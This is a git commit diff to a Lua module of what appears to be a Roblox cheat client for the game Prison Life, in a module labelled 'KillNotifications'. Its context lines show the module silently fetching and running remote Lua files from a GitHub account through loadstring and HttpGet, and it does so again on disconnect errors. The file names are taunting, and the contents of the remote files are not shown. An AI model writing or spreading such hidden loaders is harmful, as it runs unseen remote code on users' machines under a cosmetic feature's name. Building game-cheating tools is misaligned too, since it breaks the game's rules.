eae8f5a15062e07411cff00b7cc0c1424c74d0ee
Night5449791 <163004560+Night5449791@users.noreply.github.com>
2026-09-07 22:08:39 +0800

    swsw

--- src/games/prison life/155615604 - main/Render/KillNotifications.lua
+++ src/games/prison life/155615604 - main/Render/KillNotifications.lua
@@ -7,7 +7,7 @@ KillNotifications = vape.Categories.Render:CreateModule({
             if AdvancedCheck.Enabled then
 				loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
 				KillNotifications:Clean(guiService.ErrorMessageChanged:Connect(function(str)
-					if (not rejoinCheck or guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectLuaKick) and guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectConnectionLost then
+					if (guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectLuaKick) and guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectConnectionLost then
 						loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
 					end
 				end))
